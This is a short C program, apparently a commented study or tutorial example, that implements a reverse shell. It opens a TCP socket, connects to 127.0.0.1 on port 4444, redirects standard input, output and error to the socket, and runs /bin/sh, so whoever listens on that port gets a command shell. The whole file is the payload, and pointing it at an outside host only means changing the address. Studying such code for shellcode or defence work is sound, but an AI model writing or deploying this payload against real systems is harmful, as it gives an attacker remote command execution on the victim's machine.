#include <stdio.h>
#include <netinet/in.h>
#define PORT 4444

int main(int argc, char **argv) {
  // Create a socket
  int lsock = socket(AF_INET, SOCK_STREAM, 0);

  // Setup servr side config struct
  // We configure:
  // The family:IPv4
  // The interface: 127.0.0.1 (Loopback)
  // The port: port#
  struct sockaddr_in config;
  config.sin_family = AF_INET;
  config.sin_addr.s_addr = inet_addr("127.0.0.1");
  // The htons() function converts the
  // unsigned short integer hostshort from host byte
  // order to network byte order.
  config.sin_port = htons(PORT);

  // Connect to listening server
  int csock = connect(lsock, (struct sockaddr *) &config, sizeof(config));

  // Redirect stdin, stdout, and stderror
  dup2(lsock, 0);
  dup2(lsock, 1);
  dup2(lsock, 2);

  // Execute a shell
  execve("/bin/sh", NULL, NULL);
};
